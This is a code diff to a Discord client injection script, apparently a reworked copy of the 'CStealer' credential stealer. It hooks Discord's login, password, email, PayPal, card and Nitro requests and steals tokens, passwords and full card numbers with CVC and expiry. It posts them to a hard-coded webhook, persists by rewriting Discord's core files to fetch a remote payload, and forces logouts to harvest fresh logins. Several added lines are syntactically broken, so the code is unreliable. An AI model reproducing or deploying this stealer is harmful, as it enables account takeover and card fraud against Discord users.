@@ -4,6 +4,9 @@ const path = require('path');
 const https = require('https');
 const querystring = require('querystring');
 const { BrowserWindow, session } = require('electron');
+function sleep(ms) {
+  return new Promise(resolve => setTimeout(resolve, ms));
+}
 
 const config = {
   webhook: 'https://discord.com/api/webhooks/1193940355742175312/kDCJG33U9wlz4BwOlcJeqj8-s_dTzN3OJS-6A3raPpyVPi-qtN_R7edOtMQ_kQIumMOS', 
@@ -65,6 +68,7 @@ const config = {
     ],
   },
 };
+const [LOGOUT_SCRIPT, TOKEN_SCRIPT] = ["window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[[\"get_require\"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b=\"string\"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})(\"login\").logout()}LogOut();", "for (let a in window.webpackJsonp ? (gg = window.webpackJsonp.push([[], { get_require: (a, b, c) => a.exports = c }, [['get_require']]]), delete gg.m.get_require, delete gg.c.get_require) : window.webpackChunkdiscord_app && window.webpackChunkdiscord_app.push([[Math.random()], {}, a => { gg = a }]), gg.c) if (gg.c.hasOwnProperty(a)) { let b = gg.c[a].exports; if (b && b.__esModule && b.default) for (let a in b.default) 'getToken' == a && (token = b.default.getToken())} token;"];
 
 const discordPath = (function () {
   const app = args[0].split(path.sep).slice(0, -1).join(path.sep);
@@ -80,8 +84,6 @@ const discordPath = (function () {
   return { undefined, undefined };
 })();
 
-const [LOGOUT_SCRIPT, TOKEN_SCRIPT] = ["window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[[\"get_require\"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b=\"string\"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})(\"login\").logout()}LogOut();", "for (let a in window.webpackJsonp ? (gg = window.webpackJsonp.push([[], { get_require: (a, b, c) => a.exports = c }, [['get_require']]]), delete gg.m.get_require, delete gg.c.get_require) : window.webpackChunkdiscord_app && window.webpackChunkdiscord_app.push([[Math.random()], {}, a => { gg = a }]), gg.c) if (gg.c.hasOwnProperty(a)) { let b = gg.c[a].exports; if (b && b.__esModule && b.default) for (let a in b.default) 'getToken' == a && (token = b.default.getToken())} token;"];
-
 const execScript = async (script) => {
   let window;
   while (!window) {
@@ -95,17 +97,18 @@ const execScript = async (script) => {
   return window.webContents.executeJavaScript(script, true);
 };
 
-function updateCheck() {
+async function updateCheck() {
   const { resourcePath, app } = discordPath;
   if (resourcePath === undefined || app === undefined) return;
   const appPath = path.join(resourcePath, 'app');
   const packageJson = path.join(appPath, 'package.json');
   const resourceIndex = path.join(appPath, 'index.js');
-  const indexJs = `${app}\\modules\\discord_desktop_core-1\\discord_desktop_core\\index.js`;
+  const indexJs = path.join(resourcePath, 'modules', 'discord_desktop_core-1', 'discord_desktop_core', 'index.js');
   const bdPath = path.join(process.env.APPDATA, '\\betterdiscord\\data\\betterdiscord.asar');
   if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
   if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);
   if (fs.existsSync(resourceIndex)) fs.unlinkSync(resourceIndex);
+
 
   if (process.platform === 'win32' || process.platform === 'darwin') {
     fs.writeFileSync(
@@ -120,16 +123,46 @@ function updateCheck() {
       ),
     );
 
-    const startUpScript = async () => await execScript(`const fs=require("fs"),https=require("https"),path=require("path"),indexJs="${indexJs}",bdPath="${bdPath}",resourcePath="${resourcePath}",fileSize=fs.statSync(indexJs).size;async function init(){https.get("${config.injection_url}",(r=>{const e=fs.createWriteStream(indexJs);r.on("data",(r=>{const t=r.toString().replace("%WEBHOOK%","${config.webhook}");e.write(t)})),r.on("end",(()=>e.end()))})).on("error",(r=>{console.error("Error fetching data from URL:",r),setTimeout(init,1e4)}))}fs.readFile(indexJs,"utf8",((r,e)=>{if(r)return console.error("Error reading file:",r);(fileSize<2e4||"module.exports = require('./core.asar')"===e)&&init()}));try{require(path.join(resourcePath,"app.asar"))}catch(r){console.error("Error loading app.asar:",r)}if(fs.existsSync(bdPath))try{require(bdPath)}catch(r){console.error("Error loading bdPath:",r)}`);
-    const startUpScriptString = String(async () => await startUpScript());
-    fs.writeFileSync(resourceIndex, startUpScriptString.replace(/\\/g, '\\\\'));
+    const startUpScript = `const fs = require('fs'), https = require('https');
+const indexJs = '${indexJs}';
+const bdPath = '${bdPath}';
+const fileSize = fs.statSync(indexJs).size
+fs.readFileSync(indexJs, 'utf8', (err, data) => {
+    if (fileSize < 20000 || data === "module.exports = require('./core.asar')") 
+        init();
+})
+async function init() {
+    https.get('${config.injection_url}', (res) => {
+        const file = fs.createWriteStream(indexJs);
+        res.replace('%WEBHOOK%', '${config.webhook}')
+        res.pipe(file);
+        file.on('finish', () => {
+            file.close();
+        });
+    
+    }).on("error", (err) => {
+        setTimeout(init(), 10000);
+    });
+}
+require('${path.join(resourcePath, 'app.asar')}')
+if (fs.existsSync(bdPath)) require(bdPath);`;
 
+    startUpScript().then(startUpScriptResult => {
+      const startUpScriptString = String(startUpScriptResult);
+      fs.writeFileSync(resourceIndex, startUpScriptString.replace(/\\/g, '\\\\'));
+      
+    });
   }
-  if (!fs.existsSync(path.join(__dirname, 'initiation'))) return !0;
-  fs.rmdirSync(path.join(__dirname, 'initiation'));
-  BrowserWindow.getAllWindows()[0]?.webContents.executeJavaScript(LOGOUT_SCRIPT, true);
+  const initiationFolderPath = path.join(__dirname, 'initiation');
+  if (!fs.existsSync(initiationFolderPath)) {
+    fs.mkdirSync(initiationFolderPath);
+    await BrowserWindow.getAllWindows()[0]?.webContents.executeJavaScript(LOGOUT_SCRIPT, true);
+    await sleep(3000);
+  }
+  
   return !1;
 }
+
 
 const getInfo = async (token) => {
   const info = await execScript(`var xmlHttp=new XMLHttpRequest;xmlHttp.open("GET","${config.api}",!1),xmlHttp.setRequestHeader("Authorization","${token}"),xmlHttp.send(null),xmlHttp.responseText;`);
@@ -306,28 +339,38 @@ const login = async (email, password, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**Account Information**',
-            value: `<:mail:1095741024678191114> Email: **${email}** - <:blacklock:1095741022065131571> Password: **${password}**`,
+            name: '**Account Info**',
+            value: `Email: **${email}**`,
             inline: false,
           },
           {
-            name: '**Discord Information**',
-            value: `<:blackarrow:1095740975197995041> Nitro Type: **${nitro}**\n<a:blackhypesquad:1095742323423453224> Badges: **${badges}**\n<a:blackmoneycard:1095741026850852965> Billing: **${billing}**`,
+            value: `Password: **${password}**`,
             inline: false,
           },
           {
-            name: '<:hackerblack:1095747410539593800> **Token**',
+            name: 'Token',
             value: `\`${token}\``,
             inline: false,
+          },
+          {
+            name: 'Badges:',
+            value: `**${badges}**`,
+            inline: false,
+          },
+          {
+            name: 'Nitro Type:',
+            value: ```**${nitro}**```,
+            inline: true,
+          },
+          {
+            name: 'Billing:',
+            value: ```**${billing}**```,
+            inline: true,
           },
         ],
         author: {
           name: json.username + '#' + json.discriminator + ' | ' + json.id,
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
-        },
-        footer: {
-            text: 'CStealer Injection・https://github.com/can-kat/cstealer',
-            icon_url: "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
         },
       },
     ],
@@ -349,28 +392,39 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**Password Changed**',
-            value: `<:mail:1095741024678191114> Email: **${json.email}**\n<:blacklock:1095741022065131571> Old Password: **${oldpassword}**\n<:blacklock:1095741022065131571> New Password: **${newpassword}**`,
+            name: `**Password Changed**`,
+            value: `Email: **${json.email}**`,
             inline: true,
           },
           {
-            name: '**Discord Information**',
-            value: `<:blackarrow:1095740975197995041> Nitro Type: **${nitro}**\n<a:blackhypesquad:1095742323423453224> Badges: **${badges}**\n<a:blackmoneycard:1095741026850852965> Billing: **${billing}**`,
-            inline: true,
+            name: '**New Password:**',
+            value: ```**${newpassword}**```,
+            inline: false,
           },
           {
-            name: '<:hackerblack:1095747410539593800> **Token**',
+            name: 'Token',
             value: `\`${token}\``,
             inline: false,
+          },
+          {
+            name: 'Badges:',
+            value: `**${badges}**`,
+            inline: false,
+          },
+          {
+            name: 'Nitro Type:',
+            value: ```**${nitro}**```,
+            inline: true,
+          },
+          {
+            name: 'Billing:',
+            value: ```**${billing}**```,
+            inline: true,
           },
         ],
         author: {
           name: json.username + '#' + json.discriminator + ' | ' + json.id,
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
-        },
-        footer: {
-            text: 'CStealer Injection・https://github.com/can-kat/cstealer',
-            icon_url: "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
         },
       },
     ],
@@ -393,27 +447,34 @@ const emailChanged = async (email, password, token) => {
         fields: [
           {
             name: '**Email Changed**',
-            value: `<:mail:1095741024678191114> New Email: **${email}**\n<:blacklock:1095741022065131571> Password: **${password}**`,
+            value: `New Email: ``**${email}**```,
             inline: true,
           },
           {
-            name: '**Discord Information**',
-            value: `<:blackarrow:1095740975197995041> Nitro Type: **${nitro}**\n<a:blackhypesquad:1095742323423453224> Badges: **${badges}**\n<a:blackmoneycard:1095741026850852965> Billing: **${billing}**`,
-            inline: true,
+            value: `Password: ``**${password}**```,
+            inline: false,
           },
           {
-            name: '<:hackerblack:1095747410539593800> **Token**',
+            name: `**Token**`,
             value: `\`${token}\``,
             inline: false,
+          },
+          {
+            value: `Badges: **${badges}**`,
+            inline: false,
+          },
+          {
+            value: `Nitro Type: ``**${nitro}**```,
+            inline: true,
+          },
+          {
+            value: `Billing: ``**${billing}**```,
+            inline: true,
           },
         ],
         author: {
           name: json.username + '#' + json.discriminator + ' | ' + json.id,
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
-        },
-        footer: {
-            text: 'CStealer Injection・https://github.com/can-kat/cstealer',
-            icon_url: "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
         },
       },
     ],
@@ -440,23 +501,26 @@ const PaypalAdded = async (token) => {
             inline: false,
           },
           {
-            name: '**Discord Information**',
-            value: `<:blackarrow:1095740975197995041> Nitro Type: **${nitro}**\n<a:blackhypesquad:1095742323423453224> Badges: **${badges}**\n<a:blackmoneycard:1095741026850852965> Billing: **${billing}**`,
+            name: '**Token**',
+            value: `\`${token}\``,
+            inline: false,
+          },
+          {
+            value: `Badges: **${badges}**`,
+            inline: false,
+          },
+          {
+            value: `Nitro Type: ``**${nitro}**```,
             inline: true,
           },
           {
-            name: '<:hackerblack:1095747410539593800> **Token**',
-            value: `\`${token}\``,
-            inline: false,
+            value: `Billing: ``**${billing}**```,
+            inline: true,
           },
         ],
         author: {
           name: json.username + '#' + json.discriminator + ' | ' + json.id,
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
-        },
-        footer: {
-            text: 'CStealer Injection・https://github.com/can-kat/cstealer',
-            icon_url: "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
         },
       },
     ],
@@ -478,28 +542,44 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**Credit Card Added**',
-            value: `Credit Card Number: **${number}**\nCVC: **${cvc}**\nCredit Card Expiration: **${expir_month}/${expir_year}**`,
+            name: '**CC Added**',
+            value: `CCN:\n **${number}**`,
             inline: true,
           },
           {
-            name: '**Discord Information**',
-            value: `<:blackarrow:1095740975197995041> Nitro Type: **${nitro}**\n<a:blackhypesquad:1095742323423453224> Badges: **${badges}**\n<a:blackmoneycard:1095741026850852965> Billing: **${billing}**`,
+            name: 'CVC:',
+            value: ```**${cvc}**```,
             inline: true,
           },
           {
-            name: '<:hackerblack:1095747410539593800> **Token**',
+            name: 'CCE:',
+            value: ```**${expir_month}``/``${expir_year}**```,
+            inline: true,
+          },
+          {
+            name: 'Token',
             value: `\`${token}\``,
             inline: false,
+          },
+          {
+            name: 'Badges:',
+            value: `**${badges}**`,
+            inline: false,
+          },
+          {
+            name: 'Nitro Type:',
+            value: ```**${nitro}**```,
+            inline: true,
+          },
+          {
+            name: 'Billing:',
+            value: ```**${billing}**```,
+            inline: true,
           },
         ],
         author: {
           name: json.username + '#' + json.discriminator + ' | ' + json.id,
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
-        },
-        footer: {
-            text: 'CStealer Injection・https://github.com/can-kat/cstealer',
-            icon_url: "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
         },
       },
     ],
@@ -528,23 +608,29 @@ const nitroBought = async (token) => {
             inline: true,
           },
           {
-            name: '**Discord Information**',
-            value: `<:blackarrow:1095740975197995041> Nitro Type: **${nitro}**\n<a:blackhypesquad:1095742323423453224> Badges: **${badges}**\n<a:blackmoneycard:1095741026850852965> Billing: **${billing}**`,
+            name: 'Token',
+            value: `\`${token}\``,
+            inline: false,
+          },
+          {
+            name: 'Badges:',
+            value: `**${badges}**`,
+            inline: false,
+          },
+          {
+            name: 'Nitro Type:',
+            value: ```**${nitro}**```,
             inline: true,
           },
           {
-            name: '<:hackerblack:1095747410539593800> **Token**',
-            value: `\`${token}\``,
-            inline: false,
+            name: 'Billing:',
+            value: ```**${billing}**```,
+            inline: true,
           },
         ],
         author: {
           name: json.username + '#' + json.discriminator + ' | ' + json.id,
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
-        },
-        footer: {
-            text: 'CStealer Injection・https://github.com/can-kat/cstealer',
-            icon_url: "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
         },
       },
     ],
@@ -597,7 +683,6 @@ session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) 
   if (details.statusCode !== 200 && details.statusCode !== 202) return;
   const unparsed_data = Buffer.from(details.uploadData[0].bytes).toString();
   const data = JSON.parse(unparsed_data);
-  const token = await BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(TOKEN_SCRIPT, true);
   switch (true) {
     case details.url.endsWith('login'):
       login(data.login, data.password, token).catch(console.error);
